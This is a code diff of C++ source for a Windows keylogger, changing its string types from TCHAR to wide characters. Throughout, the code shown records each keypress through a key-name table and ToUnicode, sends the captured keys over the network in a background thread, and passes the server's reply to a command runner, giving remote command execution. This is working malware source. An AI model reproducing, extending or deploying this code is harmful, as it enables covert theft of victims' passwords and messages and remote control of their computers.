@@ -7,27 +7,27 @@
 
 Keylogger keylogger;
 
-const TCHAR* X = ((const TCHAR*)~0);
+const wchar_t* X = ((const wchar_t*)~0);
 
 // http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731%28v=vs.85%29.aspx
-const TCHAR* keyStrings[] =
+const wchar_t* keyStrings[] =
 {
-/* 0 */ 0, 0, 0, 0, 0, 0, 0, 0, _T("[Back]"), _T("[Tab]"), 0, 0, _T("[Clear]"), _T("[Enter]"), 0, 0,
-/* 1 */ _T("[Shift]"), _T("[Ctrl]"), _T("[Alt]"), _T("[Pause]"), _T("[CAPS]"), 0, 0, 0, 0, 0, 0, _T("[Esc]"), 0, 0, 0, 0,
-/* 2 */ _T(" "), _T("[PgUp]"), _T("[PgDown]"), _T("[End]"), _T("[Home]"), _T("[<]"), _T("[^]"), _T("[>]"), _T("[v]"), _T("[Select]"), _T("[Print]"), _T("[Execute]"), _T("[PrintScreen]"), _T("[Ins]"), _T("[Del]"), _T("[Help]"),
+/* 0 */ 0, 0, 0, 0, 0, 0, 0, 0, L"[Back]", L"[Tab]", 0, 0, L"[Clear]", L"[Enter]", 0, 0,
+/* 1 */ L"[Shift]", L"[Ctrl]", L"[Alt]", L"[Pause]", L"[CAPS]", 0, 0, 0, 0, 0, 0, L"[Esc]", 0, 0, 0, 0,
+/* 2 */ L" ", L"[PgUp]", L"[PgDown]", L"[End]", L"[Home]", L"[<]", L"[^]", L"[>]", L"[v]", L"[Select]", L"[Print]", L"[Execute]", L"[PrintScreen]", L"[Ins]", L"[Del]", L"[Help]",
 /* 3 */ X, X, X, X, X, X, X, X, X, X, 0, 0, 0, 0, 0, 0,
 /* 4 */ 0, X, X, X, X, X, X, X, X, X, X, X, X, X, X, X,
-/* 5 */ X, X, X, X, X, X, X, X, X, X, X, _T("[LWin]"), _T("[RWin]"), _T("[Apps]"), 0, _T("[Sleep]"),
-/* 6 */ X, X, X, X, X, X, X, X, X, X, _T("*"), _T("+"), 0, _T("-"), _T("."), _T("/"),
-/* 7 */ _T("[F1]"), _T("[F2]"), _T("[F3]"), _T("[F4]"), _T("[F5]"), _T("[F6]"), _T("[F7]"), _T("[F8]"), _T("[F9]"), _T("[F10]"), _T("[F11]"), _T("[F12]"), _T("[F13]"), _T("[F14]"), _T("[F15]"), _T("[F16]"),
-/* 8 */ _T("[F17]"), _T("[F18]"), _T("[F19]"), _T("[F20]"), _T("[F21]"), _T("[F22]"), _T("[F23]"), _T("[F24]"), 0, 0, 0, 0, 0, 0, 0, 0,
-/* 9 */ _T("[NumLock]"), _T("[ScrollLock]"), X, X, X, X, X, 0, 0, 0, 0, 0, 0, 0, 0, 0,
-/* A */ 0, 0, 0, 0, 0, 0, _T("[BBack]"), _T("[BForward]"), _T("[BRefresh]"), _T("[BStop]"), _T("[BSearch]"), _T("[BFavorites]"), _T("[BHome]"), _T("[VolMute]"), _T("[VolDown]"), _T("[VolUp]"),
-/* B */ _T("[MNext]"), _T("[MPrev]"), _T("[MStop]"), _T("[MPlayPause]"), _T("[LaunchMail]"), _T("LaunchSelect"), _T("[LaunchApp1]"), _T("[LaunchApp2]"), 0, 0, X, X, X, X, X, X,
+/* 5 */ X, X, X, X, X, X, X, X, X, X, X, L"[LWin]", L"[RWin]", L"[Apps]", 0, L"[Sleep]",
+/* 6 */ X, X, X, X, X, X, X, X, X, X, L"*", L"+", 0, L"-", L".", L"/",
+/* 7 */ L"[F1]", L"[F2]", L"[F3]", L"[F4]", L"[F5]", L"[F6]", L"[F7]", L"[F8]", L"[F9]", L"[F10]", L"[F11]", L"[F12]", L"[F13]", L"[F14]", L"[F15]", L"[F16]",
+/* 8 */ L"[F17]", L"[F18]", L"[F19]", L"[F20]", L"[F21]", L"[F22]", L"[F23]", L"[F24]", 0, 0, 0, 0, 0, 0, 0, 0,
+/* 9 */ L"[NumLock]", L"[ScrollLock]", X, X, X, X, X, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+/* A */ 0, 0, 0, 0, 0, 0, L"[BBack]", L"[BForward]", L"[BRefresh]", L"[BStop]", L"[BSearch]", L"[BFavorites]", L"[BHome]", L"[VolMute]", L"[VolDown]", L"[VolUp]",
+/* B */ L"[MNext]", L"[MPrev]", L"[MStop]", L"[MPlayPause]", L"[LaunchMail]", L"LaunchSelect", L"[LaunchApp1]", L"[LaunchApp2]", 0, 0, X, X, X, X, X, X,
 /* C */ X, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, X, X, X, X, X,
 /* D */ 0, X, X, X, X, 0, X, 0, 0, X, X, X, X, X, X, X,
 /* E */ X, X, X, X, X, X, 0, 0, 0, X, X, X, X, X, X, X,
-/* F */ X, X, X, X, X, X, _T("[Attn]"), _T("[CrSel]"), _T("[ExSel]"), _T("[EraseEOF]"), _T("[Play]"), _T("[Zoom]"), 0, _T("[PA1]"), _T("[Clear]"), 0,
+/* F */ X, X, X, X, X, X, L"[Attn]", L"[CrSel]", L"[ExSel]", L"[EraseEOF]", L"[Play]", L"[Zoom]", 0, L"[PA1]", L"[Clear]", 0,
 /*      0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F */
 };
 
@@ -79,13 +79,13 @@ void Keylogger::CheckKey(short i)
 
 	if (!keyPrev && keysActive[i])
 	{
-		const TCHAR* str = keyStrings[i];
+		const wchar_t* str = keyStrings[i];
 		
 		if (str == X)
 		{
 			int ret = ToUnicode(i, 0, this->keysActive, keyBuf, sizeof(keyBuf), 0);
 			if (ret > 0) {
-				keysPressed.append(Util::ws2t(keyBuf));
+				keysPressed.append(keyBuf);
 			}
 		}
 		else if (str)
@@ -98,7 +98,7 @@ void Keylogger::CheckKey(short i)
 
 typedef struct {
 	Keylogger *keylogger;
-	std::tstring keys;
+	std::wstring keys;
 } ProcSend_Data;
 DWORD WINAPI ProcSend(LPVOID lpParameter)
 {
@@ -108,26 +108,26 @@ DWORD WINAPI ProcSend(LPVOID lpParameter)
 	return 0;
 }
 
-void Keylogger::SendNewThread(const std::tstring *keys)
+void Keylogger::SendNewThread(const std::wstring *keys)
 {
-	ProcSend_Data *data = new ProcSend_Data{this, std::tstring(*keys)};
+	ProcSend_Data *data = new ProcSend_Data{this, std::wstring(*keys)};
 
 	CreateThread(0, 0xFFFF, ProcSend, data, 0, 0);
 }
-void Keylogger::Send(const std::tstring *keys)
+void Keylogger::Send(const std::wstring *keys)
 {
-	std::tstring msgText = _T("d=");
+	std::wstring msgText = L"d=";
 	msgText.append(*keys);
 	
 	size_t resp_len;
-	char *resp;
-	bool ret = network.SendAndGetText(V_NET_FILE_DATA, Util::t2s(msgText).c_str(), &resp_len, &resp);
+	wchar_t *resp;
+	bool ret = network.SendAndGetTextW(V_NET_FILE_DATA, msgText.c_str(), &resp_len, &resp);
 
 	if (ret && resp_len > 0)
 	{
 		this->IncreaseSendInterval();
 
-		cmd.Run(Util::s2t(std::string(resp, resp_len)));
+		cmd.Run(std::wstring(resp, resp_len));
 	}
 	else
 	{
